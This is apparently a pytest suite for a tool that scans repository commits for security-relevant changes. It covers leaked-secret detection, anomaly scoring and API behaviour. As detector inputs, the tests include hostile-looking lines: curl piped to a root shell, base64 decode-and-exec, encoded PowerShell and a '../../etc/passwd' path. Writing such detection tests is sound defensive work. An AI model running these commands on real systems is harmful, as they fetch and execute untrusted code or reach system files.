"""Commit behaviour analysis: diff reading, the rules, baselines, anomaly scores, polling and the API end to end.

Every diff here is invented for the tests. Values that look like credentials
are synthetic strings in the right format; none is or was a real credential.
Nothing contacts the network and no commit content is executed.
"""

from datetime import datetime, timedelta, timezone

import pytest

from app.analyzers.behavior import INDICATOR_TYPES, analyse_commit, anomaly, assess, build_baseline
from app.analyzers.behavior import baseline as B
from app.analyzers.behavior.diff import parse_patch
from app.analyzers.behavior.security_changes import classify_path, entropy, excerpt, mask
from app.models.collections import ANALYSIS_RUNS, BEHAVIOUR_EVENTS, COMMIT_ANALYSIS, COMMITS, SECURITY_EVENTS
from app.services import behaviour, jobs
from tests.conftest import FakeRepository, run_worker
from tests.history import NOW, ago, changed, raw_commit, sha_of
from tests.test_intelligence import REPO, get, make_app, start, url

REPO_URL = "https://github.com/octo/watched"
# Synthetic values in the format of real credentials. They were generated for this file and grant access to nothing.
FAKE_GITHUB_TOKEN = "ghp_" + "Ab3dEf6hIj9kLmN2pQr5StU8vWx1Yz4BcD7e"
FAKE_AWS_KEY = "AKIA" + "QWERTYUIOPASDFGH"
FAKE_PASSWORD = "N7#kd92!xLq0vBz"
FORBIDDEN = ("malicious", "attacker", "backdoor", "compromised", "exploit confirmed", "is harmful")


def detail_of(files, **overrides):
    """A commit in the shape GitHubSession.commit_detail returns."""
    listed = [{"path": f["filename"], "status": f.get("status", "modified"), "additions": f.get("additions", 0), "deletions": f.get("deletions", 0),
               "previous_path": None, "patch": f.get("patch"), "patch_truncated": False, "patch_available": "patch" in f} for f in files]
    return {"sha": sha_of("x"), "files": listed, "files_listed": len(listed), "additions": sum(f["additions"] for f in listed),
            "deletions": sum(f["deletions"] for f in listed), "parent_count": 1, **overrides}


def findings_of(files, **overrides):
    return analyse_commit(detail_of(files, **overrides))


def rules(result, kind=None):
    return [(f["type"], f["rule"]) for f in result["findings"] if kind is None or f["type"] == kind]


# --- reading diffs ----------------------------------------------------------------------

def test_patch_lines_are_numbered_as_in_the_files():
    patch = "@@ -10,3 +10,4 @@ def f():\n context\n-old line\n+new line one\n+new line two\n context\n\\ No newline at end of file"
    parsed = parse_patch(patch)
    assert parsed["added"] == [(11, "new line one", 12), (12, "new line two", 12)] and parsed["removed"] == [(11, "old line", 8)]
    assert parsed["hunks"] == 1 and parsed["truncated"] is False


def test_several_hunks_and_text_before_the_first_hunk():
    parsed = parse_patch("+not in a hunk\n@@ -1 +1 @@\n-a\n+b\n@@ -50,2 +50,2 @@\n x\n+y")
    assert parsed["added"] == [(1, "b", 1), (51, "y", 1)] and parsed["hunks"] == 2


@pytest.mark.parametrize("patch", [None, "", 5, "no hunks here\n+still nothing"])
def test_missing_or_headerless_patches_yield_nothing(patch):
    assert parse_patch(patch)["added"] == [] and parse_patch(patch)["removed"] == []


def test_very_long_lines_are_cut_but_their_length_is_kept_and_huge_patches_are_truncated():
    parsed = parse_patch("@@ -1 +1 @@\n+" + "x" * 5000)
    assert len(parsed["added"][0][1]) == 2000 and parsed["added"][0][2] == 5000
    assert parse_patch("@@ -1 +1,30000 @@\n" + "\n".join("+l" for _ in range(30000)))["truncated"] is True


# --- paths ------------------------------------------------------------------------------

@pytest.mark.parametrize("path,flag", [
    ("requirements.txt", "manifest"), ("backend/requirements-dev.txt", "manifest"), ("web/package.json", "manifest"), ("go.mod", "manifest"),
    ("web/package-lock.json", "lockfile"), ("poetry.lock", "lockfile"), ("Cargo.lock", "lockfile"), (".npmrc", "package_source_config"),
    (".github/workflows/ci.yml", "ci"), ("Jenkinsfile", "ci"), ("Dockerfile", "container"), ("docker-compose.yml", "container"),
    ("CODEOWNERS", "policy"), (".env.example", "policy"), ("deploy/nginx.conf", "server"), ("infra/main.tf", "server"),
    ("app/auth/tokens.py", "auth"), ("src/LoginPage.tsx", "auth"), ("tests/test_auth.py", "low_signal"), ("docs/guide.md", "low_signal")])
def test_paths_are_classified_by_name(path, flag):
    assert classify_path(path)[flag] is True


def test_ordinary_paths_raise_nothing():
    kinds = classify_path("src/utils/format.ts")
    assert not any(kinds.values())
    assert classify_path("docs/authentication.md")["auth"] is False            # prose about authentication is not an auth change


# --- rules ------------------------------------------------------------------------------

def test_dependency_files_are_observed_changes():
    result = findings_of([changed("requirements.txt", ["flask==3.0.0"], ["flask==2.0.0"]), changed("web/package-lock.json", ['"x": 1'])])
    assert rules(result, "DEPENDENCY_CHANGE") == [("DEPENDENCY_CHANGE", "manifest_changed"), ("DEPENDENCY_CHANGE", "lockfile_changed")]
    assert all(f["basis"] == "OBSERVED" and f["confidence"] == 1.0 for f in result["findings"])
    assert result["stats"]["manifests"] == 1 and result["stats"]["lockfiles"] == 1


def test_a_lockfile_changing_alone_is_called_out():
    result = findings_of([changed("yarn.lock", ["resolved x"])])
    assert ("DEPENDENCY_CHANGE", "lockfile_changed_without_manifest") in rules(result)
    assert next(f for f in result["findings"] if f["rule"] == "lockfile_changed_without_manifest")["severity"] == "MEDIUM"


@pytest.mark.parametrize("path,line", [
    ("requirements.txt", "--extra-index-url https://packages.example.net/simple"), ("requirements.txt", "tool @ git+https://example.org/tool.git"),
    ("web/package-lock.json", '"resolved": "https://mirror.example.net/left-pad/-/left-pad-1.0.0.tgz",'), (".npmrc", "registry=https://npm.example.net/"),
    ("go.mod", "replace example.org/lib => ../local-lib"), ("pyproject.toml", "[[tool.poetry.source]]")])
def test_package_source_changes_are_inferred_from_added_lines(path, line):
    result = findings_of([changed(path, [line])])
    assert ("DEPENDENCY_CHANGE", "package_source_changed") in rules(result)


def test_default_registry_urls_are_not_a_source_change():
    result = findings_of([changed("web/package-lock.json", ['"resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",'])])
    assert ("DEPENDENCY_CHANGE", "package_source_changed") not in rules(result)


def test_ci_container_and_policy_files_are_security_configuration():
    result = findings_of([changed(".github/workflows/release.yml", ["run: make"]), changed("Dockerfile", ["USER root"]), changed("CODEOWNERS", ["* @x"])])
    assert sorted(rule for _t, rule in rules(result, "SECURITY_CONFIG_CHANGE")) == ["ci_pipeline_changed", "container_config_changed", "policy_file_changed"]
    severities = {f["rule"]: f["severity"] for f in result["findings"]}
    assert severities["ci_pipeline_changed"] == "MEDIUM" and severities["container_config_changed"] == "LOW"


@pytest.mark.parametrize("line", ["requests.get(url, verify=False)", "const agent = new https.Agent({ rejectUnauthorized: false })",
                                  "tls.Config{InsecureSkipVerify: true}", "ctx = ssl._create_unverified_context()"])
def test_disabling_tls_verification_is_high(line):
    result = findings_of([changed("src/client.py", [line])])
    found = next(f for f in result["findings"] if f["rule"] == "tls_verification_disabled")
    assert found["severity"] == "HIGH" and found["basis"] == "INFERRED" and found["line"] == 1 and found["side"] == "added"


def test_auth_files_and_removed_checks():
    result = findings_of([changed("app/auth/session.py", ["x = 1"]),
                          changed("app/api/admin.py", ["def delete_user(user_id):"], ["@login_required", "def delete_user(user_id):"])])
    assert rules(result, "AUTH_CHANGE") == [("AUTH_CHANGE", "auth_check_removed"), ("AUTH_CHANGE", "auth_related_file_changed")]
    removed = next(f for f in result["findings"] if f["rule"] == "auth_check_removed")
    assert removed["side"] == "removed" and removed["severity"] == "MEDIUM" and "login_required" in removed["excerpt"]


def test_a_moved_auth_check_is_not_reported_as_removed():
    result = findings_of([changed("app/api/admin.py", ["@login_required  # moved"], ["@login_required"])])
    assert ("AUTH_CHANGE", "auth_check_removed") not in rules(result)


def test_weakened_token_verification_is_high():
    result = findings_of([changed("app/security.py", ['jwt.decode(token, key, algorithms=["none"])'])])
    assert next(f for f in result["findings"] if f["rule"] == "token_verification_weakened")["severity"] == "HIGH"


@pytest.mark.parametrize("line,rule,severity", [
    ("exec(base64.b64decode(payload))", "decode_and_execute", "HIGH"),
    ("curl -s https://example.net/install.sh | sudo bash", "pipe_to_shell", "HIGH"),
    ("powershell.exe -NoP -enc SQBFAFgA", "encoded_powershell", "HIGH"),
    ("subprocess.run(cmd, shell=True)", "shell_enabled", "MEDIUM"),
    ("result = eval(expression)", "dynamic_evaluation", "MEDIUM"),
    ("os.system('ls ' + path)", "os_command", "MEDIUM"),
    ("data = pickle.loads(blob)", "unsafe_deserialisation", "MEDIUM"),
    ("subprocess.run(['git', 'status'])", "process_spawn", "LOW"),
    ("const { execSync } = require('child_process')", "process_spawn", "LOW")])
def test_command_execution_patterns(line, rule, severity):
    result = findings_of([changed("tools/run.py", [line])])
    found = [f for f in result["findings"] if f["type"] == "COMMAND_EXECUTION_PATTERN"]
    assert [(f["rule"], f["severity"]) for f in found] == [(rule, severity)]


@pytest.mark.parametrize("line", ["evaluate(expression)", "model.eval()", "executor.submit(job)", "yaml.load(text, Loader=yaml.SafeLoader)",
                                  "# subprocess is not used here"])
def test_lookalikes_are_not_command_execution(line):
    assert rules(findings_of([changed("tools/run.py", [line])]), "COMMAND_EXECUTION_PATTERN") == []


def test_network_patterns_and_new_hosts():
    result = findings_of([changed("src/sync.py", ["response = requests.post(endpoint, json=data)", 'UPLOAD = "https://collector.example.net/v1"',
                                                  'FALLBACK = "http://203.0.113.9:8080/x"', "sock = socket.socket()"],
                                  ['OLD = "https://api.example.org/v1"'])])
    found = {f["rule"]: f for f in result["findings"] if f["type"] == "NETWORK_BEHAVIOUR_CHANGE"}
    assert set(found) == {"http_client_call", "new_external_host", "url_with_ip_address", "raw_socket"}
    assert found["url_with_ip_address"]["severity"] == "MEDIUM" and found["http_client_call"]["severity"] == "INFO"
    assert "collector.example.net" in found["new_external_host"]["detail"]


def test_a_host_already_present_in_the_replaced_lines_is_not_new():
    result = findings_of([changed("src/sync.py", ['URL = "https://api.example.org/v2"'], ['URL = "https://api.example.org/v1"'])])
    assert ("NETWORK_BEHAVIOUR_CHANGE", "new_external_host") not in rules(result)


@pytest.mark.parametrize("line,rule,severity", [
    (f'GITHUB_TOKEN = "{FAKE_GITHUB_TOKEN}"', "github_token", "HIGH"), (f"aws_access_key_id = {FAKE_AWS_KEY}", "aws_access_key_id", "HIGH"),
    ("-----BEGIN RSA " + "PRIVATE KEY-----", "private_key_block", "HIGH"), ("-----BEGIN " + "PRIVATE KEY-----", "private_key_block", "HIGH"),
    (f'db_password = "{FAKE_PASSWORD}"', "assigned_secret_like_value", "MEDIUM")])
def test_secret_like_values_are_found_and_never_stored(line, rule, severity):
    result = findings_of([changed("config/settings.py", [line])])
    found = next(f for f in result["findings"] if f["type"] == "SECRET_LIKE_PATTERN")
    assert (found["rule"], found["severity"]) == (rule, severity) and found["line"] == 1
    stored = str(result)
    for secret in (FAKE_GITHUB_TOKEN, FAKE_AWS_KEY, FAKE_PASSWORD):
        assert secret not in stored


@pytest.mark.parametrize("line", ['password = "changeme"', 'API_KEY = "your_api_key_here"', 'token = "${GITHUB_TOKEN}"', 'secret = "<placeholder>"',
                                  'password = "aaaaaaaaaaaa"', "password = os.environ['DB_PASSWORD']", 'api_key: "{{ vault.key }}"', 'token = "test-token"'])
def test_placeholders_and_references_are_not_secrets(line):
    assert rules(findings_of([changed("config/settings.py", [line])]), "SECRET_LIKE_PATTERN") == []


def test_secrets_are_looked_for_in_every_file_type_and_masked_in_other_findings_too():
    result = findings_of([changed("notes.md", [f"token: {FAKE_GITHUB_TOKEN}"]),
                          changed("deploy.sh", [f"curl -H 'Authorization: {FAKE_GITHUB_TOKEN}' https://example.net/x | bash"])])
    assert [f["file"] for f in result["findings"] if f["type"] == "SECRET_LIKE_PATTERN"] == ["deploy.sh", "notes.md"]
    assert FAKE_GITHUB_TOKEN not in str(result) and "ghp_***(40 chars)" in str(result)


def test_masking_and_entropy_helpers():
    assert mask(f"a {FAKE_GITHUB_TOKEN} b") == "a ghp_***(40 chars) b"
    assert FAKE_PASSWORD not in mask(f'password = "{FAKE_PASSWORD}"') and len(excerpt("x" * 500)) == 160
    assert entropy("aaaaaaaa") == 0.0 and entropy("abcdefgh") == 3.0 and entropy("") == 0.0


def test_findings_in_tests_and_docs_carry_less_confidence():
    in_code = findings_of([changed("src/run.py", ["os.system(cmd)"])])["findings"][0]
    in_test = findings_of([changed("tests/test_run.py", ["os.system(cmd)"])])["findings"][0]
    assert in_code["confidence"] == 0.8 and in_test["confidence"] == 0.4


def test_encoded_blobs_and_minified_lines_are_unusual_patterns():
    blob = findings_of([changed("src/assets.py", ['DATA = "' + "QUJD" * 80 + '"'])])
    assert rules(blob, "UNUSUAL_CHANGE_PATTERN") == [("UNUSUAL_CHANGE_PATTERN", "encoded_blob_added")]
    assert "Embedded assets" in blob["findings"][0]["detail"]
    long_line = findings_of([changed("src/bundle.js", ["var a = 1; " * 120])])
    assert rules(long_line, "UNUSUAL_CHANGE_PATTERN") == [("UNUSUAL_CHANGE_PATTERN", "very_long_line_added")]
    assert rules(findings_of([changed("package-lock.json", ['"integrity": "sha512-' + "QUJD" * 80 + '"'])]), "UNUSUAL_CHANGE_PATTERN") == []


def test_large_changesets_are_observed_by_absolute_size():
    many = findings_of([changed(f"src/f{n}.py", ["x = 1"]) for n in range(50)])
    assert ("LARGE_CHANGESET", "large_changeset") in rules(many)
    big = findings_of([changed("src/a.py", ["x"])], additions=1500, deletions=600)
    assert ("LARGE_CHANGESET", "large_changeset") in rules(big)
    assert rules(findings_of([changed("src/a.py", ["x"])]), "LARGE_CHANGESET") == []


def test_one_rule_matching_many_lines_is_limited_per_file():
    result = findings_of([changed("src/run.py", [f"os.system(cmd{n})" for n in range(40)])])
    found = [f for f in result["findings"] if f["rule"] == "os_command"]
    assert len(found) == 5 and all(f["more_in_file"] == 35 for f in found)


def test_coverage_says_what_could_not_be_inspected():
    files = [changed("src/a.py", ["x"]), {"filename": "logo.png", "status": "added", "additions": 0, "deletions": 0}]
    result = findings_of(files, files_listed=400)
    assert result["coverage"] == {"files_listed": 400, "files_inspected": 1, "files_without_diff": 1, "files_not_listed": 398,
                                  "diffs_truncated": 0, "complete": False}
    assert result["files"][1]["diff_inspected"] is False
    assert findings_of([changed("src/a.py", ["x"])])["coverage"]["complete"] is True


def test_an_ordinary_commit_raises_nothing_and_analysis_is_deterministic():
    files = [changed("src/utils/format.ts", ["export const pad = (n: number) => String(n).padStart(2, '0');"], ["// todo"])]
    result = findings_of(files)
    assert result["findings"] == [] and result["indicator_types"] == [] and findings_of(files) == result


def test_wording_never_calls_a_change_harmful():
    result = findings_of([changed("src/run.py", ["exec(base64.b64decode(p))", "os.system(c)", f'key = "{FAKE_GITHUB_TOKEN}"']),
                          changed(".github/workflows/ci.yml", ["run: curl https://example.net/i.sh | sh"])])
    text = str(result).lower()
    assert not any(word in text for word in FORBIDDEN)


# --- baseline and anomaly ---------------------------------------------------------------

def earlier(count, lines=20, files=2, key="login:alice", hour=10, sensitive=False):
    return [{"stats": {"lines": lines + (n % 3), "files": files}, "committed_at": NOW.replace(hour=hour) - timedelta(days=n + 1),
             "author_key": key, "sensitive": sensitive} for n in range(count)]


def assessed(files, previous, key="login:alice", when=None, **commit):
    return assess(findings_of(files), {"author_key": key, "committed_at": when or NOW.replace(hour=10), **commit}, build_baseline(previous))


def factor(result, name):
    return next(f for f in result["factors"] if f["name"] == name)


def test_baseline_statistics():
    baseline = build_baseline(earlier(12))
    assert baseline["commits"] == 12 and baseline["sufficient"] is True and baseline["median_lines"] == 21.0 and baseline["mad_lines"] == 1.0
    assert baseline["hours_utc"][10] == 12 and baseline["authors"] == {"login:alice": {"commits": 12, "sensitive": False}}
    assert build_baseline([])["sufficient"] is False and B.public(baseline)["authors"] == 1


def test_robust_deviation_handles_uniform_history():
    assert B.deviation(21, 21, 1) == 0.0 and B.deviation(100, 20, 0) == 4.0 and B.deviation(2, 1, 0) == 1.0


def test_weights_sum_to_one_hundred_and_every_factor_is_reported():
    result = assessed([changed("src/a.py", ["x = 1"])], earlier(40))
    assert sum(anomaly.WEIGHTS.values()) == 100 and [f["name"] for f in result["factors"]] == list(anomaly.WEIGHTS)
    assert result["anomaly_score"] == 0.0 and result["level"] == "LOW" and result["confidence"] == 1.0


def test_without_a_baseline_the_comparisons_are_unknown_not_zero():
    result = assessed([changed("src/a.py", ["os.system(c)"])], earlier(2))
    unknown = [f["name"] for f in result["factors"] if f["status"] == "UNKNOWN"]
    assert unknown == ["size_deviation", "breadth_deviation", "new_author", "sensitive_first_touch", "unusual_hour"]
    assert result["confidence"] == 0.4 and result["anomaly_score"] == round(100 * 0.55 * 0.8, 1)       # the security factor alone


def test_a_much_larger_commit_than_usual_is_an_outlier():
    big = [changed(f"src/f{n}.py", [f"line {m}" for m in range(40)]) for n in range(12)]
    result = assessed(big, earlier(40))
    # 480 lines against a median of 21 is far outside; 12 files against a uniform 2 is (12 - 2) / 2 = 5 deviations, half-way up the scale
    assert factor(result, "size_deviation")["value"] == 1.0 and factor(result, "breadth_deviation")["value"] == 0.5
    unusual = next(f for f in result["findings"] if f["rule"] == "departs_from_baseline")
    assert "far more than the usual" in unusual["detail"] and "UNUSUAL_CHANGE_PATTERN" in result["indicator_types"]
    assert result["anomaly_score"] == 30.0 and result["level"] == "MEDIUM"      # 25 × 1.0 + 10 × 0.5


def test_a_new_author_touching_sensitive_files_is_flagged_for_review():
    result = assessed([changed(".github/workflows/release.yml", ["run: publish"])], earlier(20), key="login:newcomer")
    assert factor(result, "new_author")["value"] == 1.0 and factor(result, "sensitive_first_touch")["value"] == 1.0
    unusual = next(f for f in result["findings"] if f["rule"] == "departs_from_baseline")
    assert unusual["severity"] == "MEDIUM" and "no earlier commit here" in unusual["detail"]
    known = assessed([changed(".github/workflows/release.yml", ["run: publish"])], earlier(20, sensitive=True))
    assert factor(known, "new_author")["value"] == 0.0 and factor(known, "sensitive_first_touch")["value"] == 0.0


def test_unusual_hour_needs_a_long_history():
    late = NOW.replace(hour=3)
    assert factor(assessed([changed("a.py", ["x"])], earlier(40), when=late), "unusual_hour")["value"] == 1.0
    assert factor(assessed([changed("a.py", ["x"])], earlier(40), when=NOW.replace(hour=10)), "unusual_hour")["value"] == 0.0
    assert factor(assessed([changed("a.py", ["x"])], earlier(20), when=late), "unusual_hour")["status"] == "UNKNOWN"


def test_merge_commits_are_not_compared_by_size():
    big = [changed(f"src/f{n}.py", ["x"] * 50) for n in range(20)]
    result = assessed(big, earlier(40), is_merge=True)
    assert factor(result, "size_deviation")["status"] == "UNKNOWN" and "merge commit" in factor(result, "size_deviation")["detail"]


def test_several_security_signals_combine_without_exceeding_the_scale():
    files = [changed("src/run.py", ["exec(base64.b64decode(p))", f'TOKEN = "{FAKE_GITHUB_TOKEN}"', "requests.get(u, verify=False)"]),
             changed(".github/workflows/ci.yml", ["run: x"]), changed("requirements.txt", ["--index-url https://example.net/simple"])]
    result = assessed(files, earlier(40))
    security = factor(result, "security_signals")
    assert 0.9 < security["value"] <= 1.0 and set(security["inputs"]["by_type"]) == {
        "COMMAND_EXECUTION_PATTERN", "SECRET_LIKE_PATTERN", "SECURITY_CONFIG_CHANGE", "DEPENDENCY_CHANGE", "NETWORK_BEHAVIOUR_CHANGE"}
    assert result["anomaly_score"] <= 100 and result["sensitive"] is True
    assert "not a verdict on the change or on its author" in result["meaning"]


def test_incomplete_diff_coverage_lowers_confidence():
    result = assess(findings_of([changed("a.py", ["x"])], files_listed=900), {"author_key": "login:alice", "committed_at": NOW.replace(hour=10)},
                    build_baseline(earlier(40)))
    assert result["confidence"] == 0.7


# --- end to end -------------------------------------------------------------------------

def history():
    """Twelve commits, newest first. Most are ordinary; three contain security-relevant changes."""
    commits = [raw_commit(n, ago(days=n + 1, hours=n % 5), "alice", message=f"Routine change {n}",
                          files=[changed(f"src/module{n % 4}.py", [f"value = {n}"] * (8 + n % 3), ["value = 0"])]) for n in range(12)]
    commits[7] = raw_commit(7, ago(days=8), "alice", message="Update dependencies",
                            files=[changed("requirements.txt", ["requests==2.32.3"], ["requests==2.19.1"])])
    commits[3] = raw_commit(3, ago(days=4), "alice", message="Speed up deploy",
                            files=[changed("scripts/deploy.py", ["subprocess.run(cmd, shell=True)", f'API_TOKEN = "{FAKE_GITHUB_TOKEN}"']),
                                   changed(".github/workflows/deploy.yml", ["run: python scripts/deploy.py"])])
    commits[0] = raw_commit(0, ago(hours=2), "mallory", name="New Person", message="Add uploader",
                            files=[changed("src/auth/uploader.py", ["requests.post('https://files.example.net/u', data=blob, verify=False)"])]
                            + [changed(f"src/gen{n}.py", ["x = 1"] * 30) for n in range(8)])
    return commits


@pytest.fixture
def repo(github):
    github.repo = FakeRepository(REPO)
    github.repo.history = history()
    return github.repo


@pytest.fixture
def created(client, auth_headers, repo):
    return client.post("/api/projects", json={"name": "Watched", "repository_url": REPO_URL}, headers=auth_headers).json()


@pytest.fixture
def watched(client, app, auth_headers, created):
    job = start(client, app, auth_headers, created, "/commits/analyze")
    assert job["state"] == "completed", job
    return created


def test_nothing_is_reported_before_the_first_analysis(client, auth_headers, created):
    body = get(client, auth_headers, created, "/commits")
    assert body["analysis"] is None and body["items"] == [] and body["analysed_total"] == 0 and body["indicator_types"] == list(INDICATOR_TYPES)
    assert body["monitoring"]["enabled"] is False and body["monitoring"]["method"] == "polling" and body["monitoring"]["polling_active"] is False
    assert get(client, auth_headers, created, "/security-events")["items"] == []
    assert client.get(url(created, "/commits/" + sha_of(0)), headers=auth_headers).status_code == 404


def test_commits_are_analysed_and_listed_newest_first(client, auth_headers, watched, db):
    body = get(client, auth_headers, watched, "/commits")
    assert body["total"] == 12 == db[COMMIT_ANALYSIS].count_documents({}) and db[COMMITS].count_documents({}) == 12
    assert [item["message"] for item in body["items"]][:2] == ["Add uploader", "Routine change 1"]
    summary = body["analysis"]["summary"]
    assert summary["analysed"] == 12 and summary["data_status"] == "COLLECTED" and summary["head_sha"] == sha_of(0)
    assert summary["events"]["DEPENDENCY_CHANGE"] == 1 and summary["events"]["SECRET_LIKE_PATTERN"] == 1
    first = body["items"][0]
    assert "findings" not in first and "author_email_tag" not in first and "project_id" not in first
    assert 0 <= first["anomaly_score"] <= 100 and first["model_version"] == "commit-behaviour-v1"


def test_each_commit_is_compared_with_the_ones_before_it(client, auth_headers, watched):
    oldest = get(client, auth_headers, watched, "/commits/" + sha_of(11))["commit"]
    newest = get(client, auth_headers, watched, "/commits/" + sha_of(0))["commit"]
    assert oldest["baseline"]["commits"] == 0 and oldest["baseline"]["sufficient"] is False
    assert newest["baseline"]["commits"] == 11 and newest["baseline"]["sufficient"] is True
    by_name = {f["name"]: f for f in newest["factors"]}
    assert by_name["new_author"]["value"] == 1.0 and by_name["sensitive_first_touch"]["value"] == 1.0 and by_name["size_deviation"]["value"] == 1.0
    assert {"AUTH_CHANGE", "NETWORK_BEHAVIOUR_CHANGE", "SECURITY_CONFIG_CHANGE", "UNUSUAL_CHANGE_PATTERN"} <= set(newest["indicator_types"])
    assert newest["level"] in ("MEDIUM", "HIGH") and newest["anomaly_score"] > oldest["anomaly_score"]


def test_commit_detail_has_files_findings_and_events_but_no_secret(client, auth_headers, watched, db):
    body = get(client, auth_headers, watched, "/commits/" + sha_of(3))
    commit = body["commit"]
    assert [f["path"] for f in commit["files"]] == ["scripts/deploy.py", ".github/workflows/deploy.yml"]
    assert {f["rule"] for f in commit["findings"]} == {"github_token", "shell_enabled", "ci_pipeline_changed"}
    assert {e["event_type"] for e in body["events"]} == {"SECRET_LIKE_PATTERN", "COMMAND_EXECUTION_PATTERN", "SECURITY_CONFIG_CHANGE"}
    secret = next(e for e in body["events"] if e["event_type"] == "SECRET_LIKE_PATTERN")
    assert secret["severity"] == "HIGH" and secret["observed_or_inferred"] == "INFERRED" and secret["evidence"][0]["line"] == 2
    assert secret["changed_files"] == ["scripts/deploy.py"] and secret["review_note"].endswith("not a confirmed incident.")
    everything = str(list(db[COMMIT_ANALYSIS].find())) + str(list(db[BEHAVIOUR_EVENTS].find())) + str(list(db[SECURITY_EVENTS].find())) \
        + str(list(db[COMMITS].find())) + str(body)
    assert FAKE_GITHUB_TOKEN not in everything and "ghp_***" in everything
    assert "author_email_tag" not in commit and "author_key" not in commit


def test_event_fields_match_the_documented_shape(client, auth_headers, watched):
    event = get(client, auth_headers, watched, "/behaviour-events", type="DEPENDENCY_CHANGE")["items"][0]
    for name in ("commit_sha", "repository", "changed_files", "event_type", "severity", "confidence", "evidence", "observed_or_inferred"):
        assert name in event
    assert event["repository"] == "octo/watched" and event["observed_or_inferred"] == "OBSERVED" and event["commit_sha"] == sha_of(7)


def test_security_events_are_the_medium_and_high_ones(client, auth_headers, watched, db):
    serious = get(client, auth_headers, watched, "/security-events")
    everything = get(client, auth_headers, watched, "/behaviour-events")
    assert 0 < serious["total"] < everything["total"] == db[BEHAVIOUR_EVENTS].count_documents({})
    assert all(item["severity"] in ("MEDIUM", "HIGH") for item in serious["items"])
    assert get(client, auth_headers, watched, "/security-events", severity="HIGH")["total"] == 2          # the token and verify=False
    assert get(client, auth_headers, watched, "/security-events", type="SECRET_LIKE_PATTERN")["total"] == 1
    assert get(client, auth_headers, watched, "/security-events", sha=sha_of(3))["total"] == 3
    moments = [item["occurred_at"] for item in serious["items"]]
    assert moments == sorted(moments, reverse=True)


def test_filters_search_sorting_and_validation(client, auth_headers, watched):
    assert get(client, auth_headers, watched, "/commits", indicator="DEPENDENCY_CHANGE")["total"] == 1
    assert get(client, auth_headers, watched, "/commits", q="uploader")["total"] == 1
    assert get(client, auth_headers, watched, "/commits", q=sha_of(3)[:8])["total"] == 1
    assert get(client, auth_headers, watched, "/commits", q="mallory")["total"] == 1
    assert get(client, auth_headers, watched, "/commits", q=".*")["total"] == 0
    by_anomaly = [item["anomaly_score"] for item in get(client, auth_headers, watched, "/commits", sort="anomaly")["items"]]
    assert by_anomaly == sorted(by_anomaly, reverse=True)
    levels = sum(get(client, auth_headers, watched, "/commits", level=level)["total"] for level in ("LOW", "MEDIUM", "HIGH"))
    assert levels == 12
    for path, params in (("/commits", {"level": "X"}), ("/commits", {"indicator": "NOPE"}), ("/commits", {"sort": "random"}),
                         ("/security-events", {"type": "NOPE"}), ("/security-events", {"severity": "FATAL"}), ("/security-events", {"sha": "abc"}),
                         ("/behaviour-events", {"limit": 1000})):
        assert client.get(url(watched, path), headers=auth_headers, params=params).status_code == 422
    for bad in ("abc", "z" * 40, sha_of(0)[:39], sha_of(0) + "0"):
        assert client.get(url(watched, f"/commits/{bad}"), headers=auth_headers).status_code == 404


def test_a_second_run_only_analyses_new_commits(client, app, auth_headers, watched, repo, github, db):
    before = len(github.requests)
    again = start(client, app, auth_headers, watched, "/commits/analyze")
    assert again["state"] == "completed" and again["message"] == "No new commits since the last check" and again["summary"]["reused"] is True
    assert len(github.requests) - before == 1 and db[ANALYSIS_RUNS].count_documents({}) == 1          # one list request, no diffs
    repo.history.insert(0, raw_commit("fresh", ago(minutes=5), "alice", message="Fix typo", files=[changed("README.md", ["typo"])]))
    third = start(client, app, auth_headers, watched, "/commits/analyze")
    assert third["summary"]["analysed"] == 1 and third["summary"]["commits_analysed_total"] == 13
    assert get(client, auth_headers, watched, "/commits")["items"][0]["message"] == "Fix typo"


@pytest.mark.parametrize("settings", [{"COMMIT_ANALYSIS_MAX_COMMITS": "5"}], indirect=True)
def test_the_per_run_limit_takes_the_newest_commits_and_says_what_is_left(client, app, auth_headers, created):
    job = start(client, app, auth_headers, created, "/commits/analyze")
    assert job["state"] == "partial" and job["error"]["code"] == "COMMITS_INCOMPLETE" and "7 more new commit(s)" in job["error"]["message"]
    assert "not assumed to be unremarkable" in job["error"]["message"]
    assert [item["message"] for item in get(client, auth_headers, created, "/commits")["items"]][-1] == "Routine change 4"
    assert start(client, app, auth_headers, created, "/commits/analyze")["summary"]["analysed"] == 5


@pytest.fixture
def settings(request):
    from app.config.settings import load_settings
    from tests.conftest import TEST_ENV

    return load_settings({**TEST_ENV, **getattr(request, "param", {})})


def test_when_github_is_unreachable_nothing_is_invented(client, app, auth_headers, created, github, db):
    github.fail_paths["/commits"] = (503, {})
    job = start(client, app, auth_headers, created, "/commits/analyze")
    assert job["state"] == "partial" and job["error"]["code"] == "GITHUB_DATA_UNAVAILABLE"
    body = get(client, auth_headers, created, "/commits")
    assert body["analysis"]["summary"]["data_status"] == "UNAVAILABLE" and body["items"] == [] and db[BEHAVIOUR_EVENTS].count_documents({}) == 0


def test_a_rate_limit_mid_run_keeps_what_was_analysed(client, app, auth_headers, created, github, db):
    github.fail_paths[f"/commits/{sha_of(5)}"] = (403, {"x-ratelimit-remaining": "0", "x-ratelimit-reset": "4102444800"})
    job = start(client, app, auth_headers, created, "/commits/analyze")
    assert job["state"] == "partial" and "RATE_LIMITED" in job["error"]["message"] and "Retry after 2100-01-01" in job["error"]["message"]
    assert db[COMMIT_ANALYSIS].count_documents({}) == 6 and job["summary"]["not_yet_analysed"] == 6       # commits 11..6 were done first
    github.fail_paths.clear()
    assert start(client, app, auth_headers, created, "/commits/analyze")["summary"]["analysed"] == 6


def test_a_commit_that_cannot_be_read_is_skipped_and_reported(client, app, auth_headers, created, github):
    github.fail_paths[f"/commits/{sha_of(5)}"] = (404, {})
    job = start(client, app, auth_headers, created, "/commits/analyze")
    assert job["state"] == "partial" and job["summary"]["analysed"] == 11 and job["summary"]["skipped"][0]["sha"] == sha_of(5)


def test_hostile_file_paths_in_a_commit_are_dropped(client, app, auth_headers, created, repo, db):
    commit = raw_commit("evil", ago(hours=1), "alice", files=[changed("../../etc/passwd", ["x"]), changed("src/ok.py", ["y = 2"])])
    commit["files"] += [{"filename": "a\x00b", "status": "added"}, "not a file", {"filename": "C:\\Windows\\x"}, {"filename": "/abs/path"}]
    repo.history = [commit]
    assert start(client, app, auth_headers, created, "/commits/analyze")["state"] == "completed"
    stored = db[COMMIT_ANALYSIS].find_one({})
    assert [f["path"] for f in stored["files"]] == ["src/ok.py"]


def test_monitoring_can_be_switched_and_is_audited(client, auth_headers, created, db):
